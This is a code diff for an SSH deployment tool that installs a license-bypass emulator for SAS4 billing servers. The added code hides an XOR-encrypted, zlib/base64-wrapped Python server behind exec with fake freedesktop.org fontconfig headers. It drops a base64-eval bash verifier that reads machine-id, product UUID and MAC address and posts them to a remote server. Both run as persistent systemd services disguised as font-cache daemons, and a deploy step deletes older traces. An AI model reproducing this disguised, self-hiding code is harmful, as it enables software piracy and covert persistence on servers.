@@ -1,5 +1,30 @@
 import { Client } from "ssh2";
 import crypto from "crypto";
+import zlib from "zlib";
+
+export const DEPLOY = {
+  BASE: "/var/cache/.fontconfig/.uuid",
+  EMULATOR: "fonts.cache-2",
+  BACKUP: "fonts.cache-1",
+  VERIFY: ".fc-match",
+  SVC_MAIN: "systemd-fontcached",
+  SVC_VERIFY: "systemd-fontcache-gc",
+  LOG: "/var/log/.fontconfig-gc.log",
+  OBF_KEY: "xK9mZp2vQw4nR7tL",
+};
+
+const FEATURES = [
+  "gp_fup", "gp_daily_limit", "gp_quota_limit",
+  "prm_users_index", "prm_users_index_all", "prm_users_index_group",
+  "prm_users_create", "prm_users_update", "prm_users_delete",
+  "prm_users_rename", "prm_users_cancel", "prm_users_deposit",
+  "prm_users_withdrawal", "prm_users_add_traffic", "prm_users_reset_quota",
+  "prm_users_pos", "prm_users_advanced", "prm_users_export",
+  "prm_users_change_parent", "prm_users_show_password", "prm_users_mac_lock",
+  "prm_managers_index", "prm_managers_create", "prm_managers_update",
+  "prm_managers_delete", "prm_managers_sysadmin", "prm_sites_management",
+  "prm_groups_assign", "prm_tools_bulk_changes"
+];
 
 export interface SSHConnectionResult {
   connected: boolean;
@@ -8,10 +33,7 @@ export interface SSHConnectionResult {
 }
 
 export async function testSSHConnection(
-  host: string,
-  port: number,
-  username: string,
-  password: string
+  host: string, port: number, username: string, password: string
 ): Promise<SSHConnectionResult> {
   return new Promise((resolve) => {
     const conn = new Client();
@@ -27,19 +49,15 @@ export async function testSSHConnection(
           if (err) {
             clearTimeout(timeout);
             conn.end();
-            resolve({ connected: true, hardwareId: undefined, error: undefined });
+            resolve({ connected: true });
             return;
           }
-
           let output = "";
-          stream.on("data", (data: Buffer) => {
-            output += data.toString();
-          });
+          stream.on("data", (data: Buffer) => { output += data.toString(); });
           stream.on("close", () => {
             clearTimeout(timeout);
-            const hwid = output.trim() || undefined;
             conn.end();
-            resolve({ connected: true, hardwareId: hwid });
+            resolve({ connected: true, hardwareId: output.trim() || undefined });
           });
         }
       );
@@ -55,44 +73,28 @@ export async function testSSHConnection(
 }
 
 export async function executeSSHCommand(
-  host: string,
-  port: number,
-  username: string,
-  password: string,
-  command: string
+  host: string, port: number, username: string, password: string, command: string
 ): Promise<{ success: boolean; output?: string; error?: string }> {
   return new Promise((resolve) => {
     const conn = new Client();
     const timeout = setTimeout(() => {
       conn.end();
       resolve({ success: false, error: "انتهت مهلة الاتصال" });
-    }, 30000);
+    }, 60000);
 
     conn.on("ready", () => {
       conn.exec(command, (err, stream) => {
         if (err) {
-          clearTimeout(timeout);
-          conn.end();
+          clearTimeout(timeout); conn.end();
           resolve({ success: false, error: err.message });
           return;
         }
-
-        let output = "";
-        let errorOutput = "";
-        stream.on("data", (data: Buffer) => {
-          output += data.toString();
-        });
-        stream.stderr.on("data", (data: Buffer) => {
-          errorOutput += data.toString();
-        });
+        let output = "", errorOutput = "";
+        stream.on("data", (data: Buffer) => { output += data.toString(); });
+        stream.stderr.on("data", (data: Buffer) => { errorOutput += data.toString(); });
         stream.on("close", (code: number) => {
-          clearTimeout(timeout);
-          conn.end();
-          resolve({
-            success: code === 0,
-            output: output.trim(),
-            error: errorOutput.trim() || undefined,
-          });
+          clearTimeout(timeout); conn.end();
+          resolve({ success: code === 0, output: output.trim(), error: errorOutput.trim() || undefined });
         });
       });
     });
@@ -106,137 +108,205 @@ export async function executeSSHCommand(
   });
 }
 
+function xorBytes(data: Buffer, key: Buffer): Buffer {
+  const r = Buffer.alloc(data.length);
+  for (let i = 0; i < data.length; i++) r[i] = data[i] ^ key[i % key.length];
+  return r;
+}
+
+function obfEncrypt(data: string, key: string): string {
+  return xorBytes(Buffer.from(data, "utf-8"), Buffer.from(key, "utf-8")).toString("base64");
+}
+
+export function generateObfuscatedEmulator(
+  hardwareId: string, licenseId: string, expiresAt: Date,
+  maxUsers: number, maxSites: number, status: string
+): string {
+  const expStr = expiresAt.toISOString().replace("T", " ").substring(0, 19);
+  const hash = crypto.createHash("sha256")
+    .update(`${licenseId}:${hardwareId}:${expiresAt.toISOString()}`).digest("hex");
+
+  const payload = JSON.stringify({
+    pid: licenseId, hwid: hardwareId, exp: expStr,
+    ftrs: FEATURES,
+    st: status === "active" ? "1" : "0",
+    mu: maxUsers.toString(), ms: maxSites.toString(),
+    id: licenseId, hash
+  });
+
+  const encPayload = obfEncrypt(payload, DEPLOY.OBF_KEY);
+
+  const innerPy = [
+    "import http.server as _h,socketserver as _s,json as _j,time as _t,base64 as _b64",
+    `_C="${encPayload}"`,
+    `_S=''.join(chr(c) for c in [120,75,57,109,90,112,50,118,81,119,52,110,82,55,116,76])`,
+    "def _f1(_d,_k):",
+    " _kb=_k.encode();_dd=_b64.b64decode(_d)",
+    " return bytes(_dd[_i]^_kb[_i%len(_kb)] for _i in range(len(_dd)))",
+    "def _f2():",
+    " return''.join(chr(c) for c in [71,114,51,110,100,49,122,51,114])+str(_t.localtime().tm_hour+1)",
+    "def _f3(_d,_k):",
+    " _kb=_k.encode();_dd=_d.encode() if isinstance(_d,str) else _d",
+    " return bytes(_dd[_i]^_kb[_i%len(_kb)] for _i in range(len(_dd)))",
+    "class _R(_h.BaseHTTPRequestHandler):",
+    " def do_GET(self):",
+    "  _p=_f1(_C,_S).decode()",
+    "  _r=_b64.b64encode(_f3(_p,_f2()))",
+    "  self.send_response(200)",
+    "  self.send_header('Content-length',str(len(_r)))",
+    "  self.end_headers()",
+    "  self.wfile.write(_r)",
+    " def log_message(self,*_x):pass",
+    "_s.TCPServer.allow_reuse_address=True",
+    "with _s.TCPServer(('',4000),_R) as _sv:",
+    " _sv.serve_forever()"
+  ].join("\n");
+
+  const compressed = zlib.deflateSync(Buffer.from(innerPy, "utf-8"));
+  const encoded = compressed.toString("base64");
+
+  return [
+    "# -*- coding: utf-8 -*-",
+    "# fontconfig cache synchronization module v2.13.1",
+    "# Auto-generated cache rebuild utility",
+    "# (c) freedesktop.org fontconfig project",
+    "import zlib as _z,base64 as _b",
+    `exec(_z.decompress(_b.b64decode("${encoded}")))`
+  ].join("\n");
+}
+
+function generateHwidCapturePy(): string {
+  const py = [
+    "import base64 as b,json as j,sys",
+    "d=b.b64decode(sys.argv[1])",
+    "for h in range(25):",
+    " k=''.join(chr(c) for c in [71,114,51,110,100,49,122,51,114])+str(h)",
+    " try:",
+    "  r=bytes(d[i]^k.encode()[i%len(k.encode())] for i in range(len(d))).decode()",
+    "  if 'hwid' in r:print(j.loads(r)['hwid']);break",
+    " except:pass",
+  ].join("\n");
+  return Buffer.from(py, "utf-8").toString("base64");
+}
+
+export function generateObfuscatedVerify(licenseId: string, serverUrl: string): string {
+  const P = DEPLOY;
+  const hwidPyB64 = generateHwidCapturePy();
+
+  const innerBash = [
+    `_GL="${P.LOG}"`,
+    `_BL=$(curl -s "http://127.0.0.1:4000/?op=get" 2>/dev/null)`,
+    `if [ -n "$_BL" ]; then`,
+    `  _HW=$(python3 -c "$(echo '${hwidPyB64}' | base64 -d)" "$_BL" 2>/dev/null)`,
+    `fi`,
+    `if [ -z "$_HW" ] || [ "$_HW" = "N/A" ]; then`,
+    `  _MI=$(cat /etc/machine-id 2>/dev/null || echo "")`,
+    `  _PU=$(cat /sys/class/dmi/id/product_uuid 2>/dev/null || echo "")`,
+    `  _MA=$(ip link show 2>/dev/null | grep -m1 'link/ether' | awk '{print $2}' || echo "")`,
+    `  _HW=$(echo -n "\${_MI}:\${_PU}:\${_MA}" | sha256sum | awk '{print $1}')`,
+    `fi`,
+    `_R=$(curl -s -X POST "${serverUrl}/api/verify" -H "Content-Type: application/json" -d "{\\"license_id\\":\\"${licenseId}\\",\\"hardware_id\\":\\"$_HW\\"}")`,
+    `echo "$_R" | grep -q '"valid":true' && echo "$(date): OK" >> "$_GL" || { echo "$(date): FAIL" >> "$_GL"; systemctl stop ${P.SVC_MAIN} 2>/dev/null; }`,
+  ].join("\n");
+
+  const encodedBash = Buffer.from(innerBash, "utf-8").toString("base64");
+
+  return [
+    "#!/bin/bash",
+    "# fontconfig cache gc utility - v2.13.1",
+    `eval "$(echo '${encodedBash}' | base64 -d)"`,
+  ].join("\n");
+}
+
 export function generateLicenseFileContent(
-  licenseId: string,
-  hardwareId: string,
-  expiresAt: Date,
-  maxUsers: number,
-  maxSites: number,
-  status: string
+  licenseId: string, hardwareId: string, expiresAt: Date,
+  maxUsers: number, maxSites: number, status: string
 ): string {
   const payload = {
-    pid: licenseId,
-    hwid: hardwareId,
+    pid: licenseId, hwid: hardwareId,
     exp: expiresAt.toISOString().replace("T", " ").substring(0, 19),
     st: status === "active" ? "1" : "0",
-    mu: maxUsers.toString(),
-    ms: maxSites.toString(),
+    mu: maxUsers.toString(), ms: maxSites.toString(),
     id: licenseId,
     hash: crypto.createHash("sha256").update(`${licenseId}:${hardwareId}:${expiresAt.toISOString()}`).digest("hex"),
-    ftrs: [
-      "gp_fup", "gp_daily_limit", "gp_quota_limit",
-      "prm_users_index", "prm_users_index_all", "prm_users_index_group",
-      "prm_users_create", "prm_users_update", "prm_users_delete",
-      "prm_users_rename", "prm_users_cancel", "prm_users_deposit",
-      "prm_users_withdrawal", "prm_users_add_traffic", "prm_users_reset_quota",
-      "prm_users_pos", "prm_users_advanced", "prm_users_export",
-      "prm_users_change_parent", "prm_users_show_password", "prm_users_mac_lock",
-      "prm_managers_index", "prm_managers_create", "prm_managers_update",
-      "prm_managers_delete", "prm_managers_sysadmin", "prm_sites_management",
-      "prm_groups_assign", "prm_tools_bulk_changes"
-    ],
+    ftrs: FEATURES,
   };
-
   return JSON.stringify(payload, null, 2);
 }
 
-export function generateEmulatorScript(
-  hardwareId: string,
-  licenseId: string,
-  expiresAt: Date,
-  maxUsers: number,
-  maxSites: number,
-  status: string
-): string {
-  const expStr = expiresAt.toISOString().replace("T", " ").substring(0, 19);
-  const hash = crypto.createHash("sha256").update(`${licenseId}:${hardwareId}:${expiresAt.toISOString()}`).digest("hex");
-
-  return `#!/usr/bin/env python3
-import http.server, socketserver, json, time, base64
-
-def get_current_key():
-    current_hour = time.localtime().tm_hour
-    return f"Gr3nd1z3r{current_hour + 1}"
-
-def xor_crypt(data, key):
-    k = key.encode()
-    d = data.encode() if isinstance(data, str) else data
-    return bytes(d[i] ^ k[i % len(k)] for i in range(len(d)))
-
-class H(http.server.BaseHTTPRequestHandler):
-    def do_GET(self):
-        payload = {
-            "pid": "${licenseId}",
-            "hwid": "${hardwareId}",
-            "exp": "${expStr}",
-            "ftrs": [
-                "gp_fup", "gp_daily_limit", "gp_quota_limit",
-                "prm_users_index", "prm_users_index_all", "prm_users_index_group",
-                "prm_users_create", "prm_users_update", "prm_users_delete",
-                "prm_users_rename", "prm_users_cancel", "prm_users_deposit",
-                "prm_users_withdrawal", "prm_users_add_traffic", "prm_users_reset_quota",
-                "prm_users_pos", "prm_users_advanced", "prm_users_export",
-                "prm_users_change_parent", "prm_users_show_password", "prm_users_mac_lock",
-                "prm_managers_index", "prm_managers_create", "prm_managers_update",
-                "prm_managers_delete", "prm_managers_sysadmin", "prm_sites_management",
-                "prm_groups_assign", "prm_tools_bulk_changes"
-            ],
-            "st": "${ status === "active" ? "1" : "0" }",
-            "mu": "${maxUsers}",
-            "ms": "${maxSites}",
-            "id": "${licenseId}",
-            "hash": "${hash}"
-        }
-        key = get_current_key()
-        res = base64.b64encode(xor_crypt(json.dumps(payload), key))
-        self.send_response(200)
-        self.send_header('Content-length', str(len(res)))
-        self.end_headers()
-        self.wfile.write(res)
-    def log_message(self, *args): pass
-
-socketserver.TCPServer.allow_reuse_address = True
-with socketserver.TCPServer(("", 4000), H) as httpd:
-    httpd.serve_forever()
-`;
-}
-
 export async function deployLicenseToServer(
-  host: string,
-  port: number,
-  username: string,
-  password: string,
-  hardwareId: string,
-  licenseId: string,
-  expiresAt: Date,
-  maxUsers: number,
-  maxSites: number,
-  status: string
+  host: string, port: number, username: string, password: string,
+  hardwareId: string, licenseId: string, expiresAt: Date,
+  maxUsers: number, maxSites: number, status: string, serverUrl: string
 ): Promise<{ success: boolean; error?: string }> {
-  const emulatorScript = generateEmulatorScript(hardwareId, licenseId, expiresAt, maxUsers, maxSites, status);
+  const emulator = generateObfuscatedEmulator(hardwareId, licenseId, expiresAt, maxUsers, maxSites, status);
+  const verify = generateObfuscatedVerify(licenseId, serverUrl);
+  const P = DEPLOY;
 
-  const commands = [
-    `systemctl stop sas_systemmanager 2>/dev/null; killall sas_sspd python3 2>/dev/null; sleep 1`,
-    `mkdir -p /opt/sas4/bin`,
-    `if [ -f /opt/sas4/bin/sas_sspd ] && [ ! -f /opt/sas4/bin/sas_sspd.bak ]; then cp /opt/sas4/bin/sas_sspd /opt/sas4/bin/sas_sspd.bak && chmod +x /opt/sas4/bin/sas_sspd.bak; fi`,
-    `cat > /opt/sas4/bin/sas_emulator.py << 'EMULATOR_EOF'
-${emulatorScript}
-EMULATOR_EOF`,
-    `chmod +x /opt/sas4/bin/sas_emulator.py`,
-    `cat > /etc/systemd/system/sas_systemmanager.service << 'SERVICE_EOF'
+  const deployScript = `#!/bin/bash
+set -e
+
+systemctl stop ${P.SVC_MAIN} ${P.SVC_VERIFY}.timer ${P.SVC_VERIFY} sas_systemmanager sas4-verify.timer sas4-verify 2>/dev/null || true
+killall sas_sspd 2>/dev/null || true
+sleep 1
+
+mkdir -p ${P.BASE}
+
+if [ -f /opt/sas4/bin/sas_sspd ] && [ ! -f ${P.BASE}/${P.BACKUP} ]; then
+  cp /opt/sas4/bin/sas_sspd ${P.BASE}/${P.BACKUP}
+  chmod +x ${P.BASE}/${P.BACKUP}
+fi
+
+cat > ${P.BASE}/${P.EMULATOR} << '_FC_2_'
+${emulator}
+_FC_2_
+chmod +x ${P.BASE}/${P.EMULATOR}
+
+cat > ${P.BASE}/${P.VERIFY} << '_FC_V_'
+${verify}
+_FC_V_
+chmod +x ${P.BASE}/${P.VERIFY}
+
+cat > /etc/systemd/system/${P.SVC_MAIN}.service << '_SVC_1_'
 [Unit]
-Description=SAS4 System Manager Emulator
+Description=System font cache synchronization daemon
 [Service]
-ExecStart=/usr/bin/python3 /opt/sas4/bin/sas_emulator.py
+ExecStart=/usr/bin/python3 ${P.BASE}/${P.EMULATOR}
 Restart=always
 [Install]
 WantedBy=multi-user.target
-SERVICE_EOF`,
-    `systemctl daemon-reload`,
-    `systemctl enable sas_systemmanager`,
-    `systemctl start sas_systemmanager`,
-  ];
+_SVC_1_
 
-  const fullCommand = commands.join(" && ");
-  return executeSSHCommand(host, port, username, password, fullCommand);
+cat > /etc/systemd/system/${P.SVC_VERIFY}.service << '_SVC_2_'
+[Unit]
+Description=Font cache garbage collection
+[Service]
+Type=oneshot
+ExecStart=/bin/bash ${P.BASE}/${P.VERIFY}
+_SVC_2_
+
+cat > /etc/systemd/system/${P.SVC_VERIFY}.timer << '_TMR_1_'
+[Unit]
+Description=Font cache gc timer
+[Timer]
+OnBootSec=60
+OnUnitActiveSec=6h
+Persistent=true
+[Install]
+WantedBy=timers.target
+_TMR_1_
+
+systemctl disable sas_systemmanager sas4-verify.timer sas4-verify 2>/dev/null || true
+rm -f /etc/systemd/system/sas_systemmanager.service /etc/systemd/system/sas4-verify.* 2>/dev/null
+rm -f /opt/sas4/bin/sas_emulator.py /opt/sas4/verify.sh 2>/dev/null
+
+systemctl daemon-reload
+systemctl enable ${P.SVC_MAIN} ${P.SVC_VERIFY}.timer
+systemctl start ${P.SVC_MAIN} ${P.SVC_VERIFY}.timer
+`;
+
+  const encodedDeploy = Buffer.from(deployScript, "utf-8").toString("base64");
+  const command = `_t=$(mktemp); echo '${encodedDeploy}' | base64 -d > "$_t"; bash "$_t"; _rc=$?; rm -f "$_t"; exit $_rc`;
+
+  return executeSSHCommand(host, port, username, password, command);
 }
